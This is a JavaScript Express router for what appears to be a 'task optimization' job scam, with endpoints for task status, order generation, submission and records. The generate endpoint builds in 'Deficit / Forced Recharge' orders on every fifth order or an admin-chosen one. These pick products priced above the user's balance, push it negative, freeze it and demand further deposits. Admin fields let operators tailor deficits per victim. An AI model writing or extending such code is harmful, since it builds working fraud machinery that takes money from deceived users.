const express = require('express');
const router = express.Router();
const db = require('../db');
const { authMiddleware } = require('../middleware/auth');

// Helper: auto-reset daily stats if date has changed
async function autoResetIfNewDay(user) {
  const today = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
  const lastReset = user.last_reset_date ? String(user.last_reset_date).slice(0, 10) : null;
  if (lastReset !== today) {
    await db.updateUser(user.id, {
      today_tasks_completed: 0,
      today_profit: 0,
      current_set: 0,
      last_reset_date: today
    });
    // Return refreshed user
    return await db.findUserById(user.id);
  }
  return user;
}

// GET /api/tasks/status - Get current user task statistics
router.get('/status', authMiddleware, async (req, res) => {
  let user = await db.findUserById(req.user.id);
  user = await autoResetIfNewDay(user);

  const settings = await db.getSettings();
  const vipRate = (settings.vip_rates && settings.vip_rates[user.vip_level]) || { commission: 0.005, max_tasks: 38 };
  // Admin-set custom daily limit takes priority over VIP default
  const maxTasks = (user.custom_daily_limit && user.custom_daily_limit > 0)
    ? user.custom_daily_limit
    : (vipRate.max_tasks || settings.daily_tasks_limit || 38);

  const userTasks = await db.getTasks(user.id);

  res.json({
    success: true,
    data: {
      balance: user.balance,
      frozen_balance: user.frozen_balance,
      today_profit: user.today_profit,
      today_tasks_completed: user.today_tasks_completed,
      max_tasks: maxTasks,
      custom_daily_limit: user.custom_daily_limit || null,
      vip_level: user.vip_level,
      commission_rate: vipRate.commission,
      recent_tasks: userTasks.slice(0, 10)
    }
  });
});

// POST /api/tasks/generate - Simulate product matching
router.post('/generate', authMiddleware, async (req, res) => {
  let user = await db.findUserById(req.user.id);
  // Auto-reset daily stats if it's a new day
  user = await autoResetIfNewDay(user);

  const settings = await db.getSettings();
  const vipRate = (settings.vip_rates && settings.vip_rates[user.vip_level]) || { commission: 0.20, max_tasks: 38 };
  // Admin-set custom daily limit takes priority over VIP default
  const maxTasks = (user.custom_daily_limit && user.custom_daily_limit > 0)
    ? user.custom_daily_limit
    : (vipRate.max_tasks || 38);

  if (user.today_tasks_completed >= maxTasks) {
    return res.status(400).json({
      success: false,
      message: `You have completed all ${maxTasks} daily optimization tasks. Please return tomorrow!`
    });
  }

  // Check if there is already a pending task for this user
  const existingTasks = await db.getTasks(user.id);
  const existingPending = existingTasks.find(t => t.status === 'pending');
  if (existingPending) {
    return res.json({
      success: true,
      task: existingPending,
      is_existing: true
    });
  }

  if (user.balance <= 0) {
    return res.status(400).json({
      success: false,
      message: 'Insufficient working balance to match merchant orders. Please deposit funds to continue.'
    });
  }

  const currentOrder = user.today_tasks_completed + 1;
  const products = await db.getProducts();

  // Get user's previous tasks to ensure product variety (no duplicates)
  const userTasks = await db.getTasks(user.id);
  const usedProductNames = new Set(userTasks.map(t => t.product_name));
  let availableProducts = products.filter(p => !usedProductNames.has(p.name));
  if (availableProducts.length === 0) {
    availableProducts = [...products];
  }

  const commissionRate = vipRate.commission || 0.20;

  // Check if this is a Deficit / Forced Recharge Order:
  // 1. Admin explicitly configured custom deficit for this user
  const isAdminCustom = Boolean(user.custom_order_num && (user.custom_order_num === currentOrder || user.custom_order_num <= currentOrder));
  // 2. Default automatic rule: 5th order (or every 5th order)
  const isFifthOrder = Boolean(currentOrder === 5 || (currentOrder > 0 && currentOrder % 5 === 0));
  const isDeficit = isAdminCustom || isFifthOrder;

  let orderPrice;
  let deficitAmount = 0;
  let selectedProduct;

  if (isDeficit) {
    // Determine deficit amount (default $20 - $30, or admin configured)
    deficitAmount = user.custom_deficit_amount !== null && user.custom_deficit_amount !== undefined
      ? parseFloat(user.custom_deficit_amount)
      : parseFloat((25 + Math.floor(Math.random() * 10)).toFixed(2));

    if (user.custom_product_name && user.custom_product_price) {
      orderPrice = parseFloat(user.custom_product_price);
      deficitAmount = Math.max(10, parseFloat((orderPrice - user.balance).toFixed(2)));
      selectedProduct = {
        name: user.custom_product_name,
        price: orderPrice,
        image: 'client/assets/uploads/products/outdoor_shed.jpg'
      };
      // Match image if product exists in catalog
      const matched = products.find(p => p.name.toLowerCase().includes(user.custom_product_name.toLowerCase()));
      if (matched && matched.image) selectedProduct.image = matched.image;
    } else {
      // Find a high-value trusted product closest to target price (user.balance + deficit)
      const targetRequiredPrice = parseFloat((user.balance + deficitAmount).toFixed(2));
      // Look for products with price >= targetRequiredPrice, or closest
      const deficitCandidates = products.filter(p => parseFloat(p.price) >= targetRequiredPrice);
      if (deficitCandidates.length > 0) {
        // Pick the one closest to targetRequiredPrice
        deficitCandidates.sort((a, b) => parseFloat(a.price) - parseFloat(b.price));
        selectedProduct = deficitCandidates[0];
        orderPrice = parseFloat(selectedProduct.price);
        deficitAmount = parseFloat((orderPrice - user.balance).toFixed(2));
      } else {
        // Fallback: use highest price product available (e.g. Lifetime Shed or Glow Sticks)
        const sortedDesc = [...products].sort((a, b) => parseFloat(b.price) - parseFloat(a.price));
        selectedProduct = sortedDesc[0] || {
          name: 'Lifetime 9446 Outdoor Storage Shed, 12x 16 Foot, Desert Sand Black&Brown (2 in set)',
          price: 3674.00,
          image: 'client/assets/uploads/products/outdoor_shed.jpg'
        };
        orderPrice = parseFloat(selectedProduct.price);
        deficitAmount = parseFloat((orderPrice - user.balance).toFixed(2));
      }
    }
  } else {
    // Orders 1 to 4: Real products scaled realistically within user's working balance
    const userBal = Math.max(20, parseFloat(user.balance || 0));
    let minBudget = 9.00;
    let maxBudget = 25.00;

    if (currentOrder === 1) {
      minBudget = 9.00;
      maxBudget = Math.min(25.00, userBal * 0.35);
    } else if (currentOrder === 2) {
      minBudget = 18.00;
      maxBudget = Math.min(45.00, userBal * 0.50);
    } else if (currentOrder === 3) {
      minBudget = 30.00;
      maxBudget = Math.min(75.00, userBal * 0.65);
    } else {
      minBudget = 45.00;
      maxBudget = Math.min(120.00, userBal * 0.75);
    }

    // Filter available products that fit within budget and user's balance
    let matching = availableProducts.filter(p => {
      const pr = parseFloat(p.price);
      return pr >= minBudget && pr <= maxBudget && pr < (userBal * 0.90);
    });

    if (matching.length === 0) {
      // Fallback to any product that is less than 85% of balance
      matching = availableProducts.filter(p => parseFloat(p.price) < (userBal * 0.85));
    }
    if (matching.length === 0) {
      // If balance is very low, pick the lowest price product in database
      const sortedAsc = [...availableProducts].sort((a, b) => parseFloat(a.price) - parseFloat(b.price));
      matching = [sortedAsc[0]];
    }

    // Random selection from the matching trusted products
    selectedProduct = matching[Math.floor(Math.random() * matching.length)];
    orderPrice = parseFloat(selectedProduct.price);
  }

  const commissionAmount = parseFloat((orderPrice * commissionRate).toFixed(2));
  const productName = selectedProduct.name;
  const productImage = selectedProduct.image || 'client/assets/uploads/products/outdoor_shed.jpg';

  // Deduct order price from user's working balance upon order grab
  const newBalance = parseFloat((user.balance - orderPrice).toFixed(2));
  const userUpdates = { balance: newBalance };
  if (isDeficit) {
    userUpdates.frozen_balance = Math.abs(newBalance);
  }
  await db.updateUser(user.id, userUpdates);

  const task = {
    id: 'tsk_' + Date.now() + '_' + Math.floor(Math.random() * 1000),
    user_id: user.id,
    product_name: productName,
    product_image: productImage,
    product_price: orderPrice,
    commission_rate: commissionRate,
    commission_earned: commissionAmount,
    commission_amount: commissionAmount,
    status: 'pending',
    order_num: currentOrder,
    is_deficit: isDeficit ? 1 : 0,
    deficit_amount: deficitAmount,
    created_at: new Date().toISOString()
  };

  await db.createTask(task);

  res.json({
    success: true,
    task,
    new_balance: newBalance,
    is_deficit: isDeficit,
    deficit_amount: deficitAmount
  });
});

// POST /api/tasks/submit - Submit review and claim commission
router.post('/submit', authMiddleware, async (req, res) => {
  try {
    const { taskId } = req.body;
    const user = await db.findUserById(req.user.id);

    if (!taskId) {
      return res.status(400).json({ success: false, message: 'Task ID required' });
    }

    const tasks = await db.getTasks(user.id);
    const task = tasks.find(t => String(t.id) === String(taskId));

    if (!task) {
      return res.status(404).json({ success: false, message: 'Optimization task not found' });
    }

    if (task.status === 'completed') {
      return res.status(400).json({ success: false, message: 'Task already completed and commission claimed.' });
    }

    const userBalance = parseFloat(user.balance || 0);
    const taskPrice = parseFloat(task.product_price || 0);
    const commAmount = parseFloat(task.commission_amount !== undefined ? task.commission_amount : (task.commission_earned || 0));

    // If user's balance is negative, deficit has not been cleared
    if (userBalance < 0) {
      const deficit = parseFloat(Math.abs(userBalance).toFixed(2));
      await db.updateUser(user.id, { frozen_balance: deficit });

      return res.status(400).json({
        success: false,
        reachedLimit: true,
        message: 'You have reached the frozen limit.',
        userFrozenBalance: deficit.toFixed(2),
        deficit_amount: deficit,
        product_price: taskPrice,
        user_balance: userBalance
      });
    }

    // Update task to completed
    await db.updateTask(task.id, {
      status: 'completed',
      commission_earned: commAmount
    });

    // Credit original order price + earned commission back into user balance
    const updatedBalance = parseFloat((userBalance + taskPrice + commAmount).toFixed(2));
    const newTodayProfit = parseFloat(((parseFloat(user.today_profit) || 0) + commAmount).toFixed(2));
    const newCompletedTasks = (parseInt(user.today_tasks_completed, 10) || 0) + 1;
    const newTotalTasks = (parseInt(user.total_tasks_completed, 10) || 0) + 1;

    const updates = {
      balance: updatedBalance,
      frozen_balance: 0.00, // Deficit cleared on successful completion
      today_profit: newTodayProfit,
      today_tasks_completed: newCompletedTasks,
      total_tasks_completed: newTotalTasks,
      current_set: newCompletedTasks
    };

    // If this fulfilled an admin custom assignment, clear the custom overrides
    if (user.custom_order_num && user.custom_order_num <= newCompletedTasks) {
      updates.custom_order_num = null;
      updates.custom_deficit_amount = null;
      updates.custom_product_name = null;
      updates.custom_product_price = null;
    }

    await db.updateUser(user.id, updates);

    return res.json({
      success: true,
      message: `Optimization successful! +$${commAmount.toFixed(2)} credited to your account.`,
      data: {
        balance: updatedBalance,
        frozen_balance: 0.00,
        today_profit: newTodayProfit,
        today_tasks_completed: newCompletedTasks,
        commission_earned: commAmount
      }
    });
  } catch (err) {
    console.error('Task submit error:', err);
    return res.status(500).json({
      success: false,
      message: 'Error submitting optimization task. Please try again.'
    });
  }
});

// GET /api/tasks/records - List all user tasks with full product details
router.get('/records', authMiddleware, async (req, res) => {
  try {
    const statusFilter = req.query.status;
    const userTasks = await db.getTasks(req.user.id);
    const userDeposits = await db.getDeposits(req.user.id);
    const userWithdrawals = await db.getWithdrawals(req.user.id);
    const allProducts = await db.getProducts().catch(() => []);

    const formattedTasks = userTasks.map(t => {
      let prodImage = t.product_image;
      if (!prodImage || prodImage.includes('undefined')) {
        const match = allProducts.find(p => p.name && t.product_name && (p.name.toLowerCase().includes(t.product_name.substring(0, 15).toLowerCase()) || t.product_name.toLowerCase().includes(p.name.substring(0, 15).toLowerCase())));
        prodImage = (match && match.image) ? match.image : 'client/assets/uploads/products/outdoor_shed.jpg';
      }
      return {
        id: t.id,
        type: 'task',
        title: t.product_name,
        product_name: t.product_name,
        product_image: prodImage,
        product_price: parseFloat(t.product_price || 0).toFixed(2),
        commission_amount: parseFloat(t.commission_amount !== undefined ? t.commission_amount : (t.commission_earned || 0)).toFixed(2),
        order_num: t.order_num || 1,
        amount: `+$${parseFloat(t.commission_amount !== undefined ? t.commission_amount : (t.commission_earned || 0)).toFixed(2)}`,
        status: t.status,
        created_at: t.created_at
      };
    });

    let filteredTasks = [...formattedTasks];
    if (statusFilter && statusFilter !== 'all') {
      if (statusFilter === 'pending') {
        filteredTasks = filteredTasks.filter(r => r.status === 'pending');
      } else if (statusFilter === 'completed') {
        filteredTasks = filteredTasks.filter(r => r.status === 'completed' || r.status === 'approved');
      }
    }

    res.json({
      success: true,
      tasks: filteredTasks,
      all_tasks: formattedTasks,
      deposits: userDeposits,
      withdrawals: userWithdrawals
    });
  } catch (err) {
    console.error('Records fetch error:', err);
    res.status(500).json({ success: false, message: 'Error fetching records' });
  }
});

module.exports = router;
